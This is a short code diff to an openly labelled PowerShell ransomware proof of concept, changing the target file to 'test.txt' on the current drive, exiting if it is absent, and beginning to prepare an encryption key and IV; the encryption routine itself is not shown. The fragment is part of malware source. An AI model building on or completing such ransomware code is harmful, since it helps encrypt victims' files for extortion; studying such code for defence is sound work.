@@ -1,6 +1,8 @@
 # BTBit Powershell Ransomware PoC 
 # file to encrypt
-$file = "test.txt"
+$drive = (get-location).Drive.Name
+$file = $drive + ":\test.txt"
+if (-not(Test-Path -Path $file -PathType Leaf)) { $host.Exit() }
 #
 # Prepare encryption key and IV
 $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider 
